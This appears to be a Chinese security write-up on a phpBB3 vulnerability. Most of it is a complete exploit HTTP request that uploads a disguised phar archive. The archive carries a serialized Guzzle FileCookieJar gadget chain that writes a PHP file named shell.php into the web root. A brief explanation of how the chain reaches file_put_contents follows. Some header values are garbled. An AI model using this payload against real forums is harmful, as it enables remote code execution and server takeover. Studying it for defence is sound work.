
## 利用脚本

```
POST /phpBB3/posting.php?mode=post&f=2&sid=a3f8b226bd4ad508d8838284c0cfc332 HTTP/1.1

Host: bugtest.com

Content-Length: 1909

Origin: da8K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0#2k6%4c8W2M7%4c8Q4x3X3g2U0L8$3@1`.

x-requested-with: XMLHttpRequest

x-phpbb-using-plupload: 1

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuHMhmTMPyBMwbiEg

Accept: */*

Referer: 257K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0#2k6%4c8W2M7%4c8Q4x3V1k6H3K9s2m8n7b7U0y4Q4x3V1k6H3L8%4y4@1K9h3&6Y4i4K6u0W2M7r3S2H3i4K6y4r3L8h3!0V1k6g2)9K6c8s2m8G2M7%4c8Q4x3U0k6S2L8i4m8Q4x3@1u0X3i4K6y4p5x3W2)9J5y4X3q4E0M7q4)9K6b7Y4y4A6k6q4)9K6c8o6f1J5j5K6j5K6j5X3j5H3y4X3k6V1k6h3q4W2k6U0j5H3k6r3f1&6j5U0S2X3j5X3p5I4k6r3f1&6y4$3q4V1

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9

Connection: close



------WebKitFormBoundaryuHMhmTMPyBMwbiEg

Content-Disposition: form-data; name="name"



rai4over.zip

------WebKitFormBoundaryuHMhmTMPyBMwbiEg

Content-Disposition: form-data; name="chunk"



0

------WebKitFormBoundaryuHMhmTMPyBMwbiEg

Content-Disposition: form-data; name="chunks"



3

------WebKitFormBoundaryuHMhmTMPyBMwbiEg

Content-Disposition: form-data; name="add_file"



Add the file

------WebKitFormBoundaryuHMhmTMPyBMwbiEg

Content-Disposition: form-data; name="real_filename"



payload.phar.zip

------WebKitFormBoundaryuHMhmTMPyBMwbiEg

Content-Disposition: form-data; name="attachment_data[0][attach_id]"



16

------WebKitFormBoundaryuHMhmTMPyBMwbiEg

Content-Disposition: form-data; name="attachment_data[0][is_orphan]"



1

------WebKitFormBoundaryuHMhmTMPyBMwbiEg

Content-Disposition: form-data; name="attachment_data[0][real_filename]"



payload.zip

------WebKitFormBoundaryuHMhmTMPyBMwbiEg

Content-Disposition: form-data; name="attachment_data[0][attach_comment]"





------WebKitFormBoundaryuHMhmTMPyBMwbiEg

Content-Disposition: form-data; name="attachment_data[0][filesize]"



35802

------WebKitFormBoundaryuHMhmTMPyBMwbiEg

Content-Disposition: form-data; name="fileupload"; filename="payload.phar.zip"

Content-Type: application/zip



<?php __HALT_COMPILER(); ?>

ÕO:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:41:"GuzzleHttp\Cookie\FileCookieJarfilename";s:42:"/Applications/MAMP/htdocs/phpBB3/shell.php";s:52:"GuzzleHttp\Cookie\FileCookieJarstoreSessionCookies";b:1;s:36:"GuzzleHttp\Cookie\CookieJarcookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:33:"GuzzleHttp\Cookie\SetCookiedata";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:18:"<?php phpinfo();?>";}}}s:39:"GuzzleHttp\Cookie\CookieJarstrictMode";N;}test.txtöì\~Ø¶test¨~ê÷z]©äg­4GBMB

------WebKitFormBoundaryuHMhmTMPyBMwbiEg--
```

至此我们已经对上传文件路径内容可知可控，还恶意文件中的利用链。

### 利用链

利用PHP网络请求插件`Guzzle`完成反序列化利用。

文件位置：`phpBB3/vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php`

![图片描述](https://bbs.kanxue.com/upload/attach/201910/869464_WV8H69MGW72GEWJ.png)

析构函数调用`save`函数，最后使用`file_put_contents`完成文件写入，整个漏洞利用完成。
